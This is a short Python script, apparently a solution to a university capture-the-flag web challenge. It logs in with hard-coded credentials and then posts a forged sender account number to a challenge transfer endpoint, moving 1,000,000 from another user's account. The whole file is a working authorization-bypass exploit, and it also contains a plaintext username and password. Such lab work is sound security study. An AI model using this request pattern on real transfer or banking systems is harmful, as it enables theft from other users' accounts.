import requests, sys

loginpayload = {"login": "alexrose" , "pwd":"asdfqwerzxcv" }

session = requests.Session()

url = "http://cs495.oregonctf.org/login"

response = session.post(url, data=loginpayload)

#targetUrl = "http://cs495.oregonctf.org/challenges/1f0935baec6ba69d79cfb2eba5fdfa6ac5d77fadee08585eb98b130ec524d00cCurrentBalance"
targetUrl = "http://cs495.oregonctf.org/challenges/1f0935baec6ba69d79cfb2eba5fdfa6ac5d77fadee08585eb98b130ec524d00cTransfer"

#account balance discovery section
#accountNumber =sys.argv[1]
#postData = {"accountNumber":accountNumber}

#Let's transfer ourselves some money from the rich guy!
postData = {"senderAccountNumber":"1",
            "recieverAccountNumber":"20",
            "transferAmount":"1000000"}

response2 = session.post(targetUrl, data=postData)

print(response2.text)
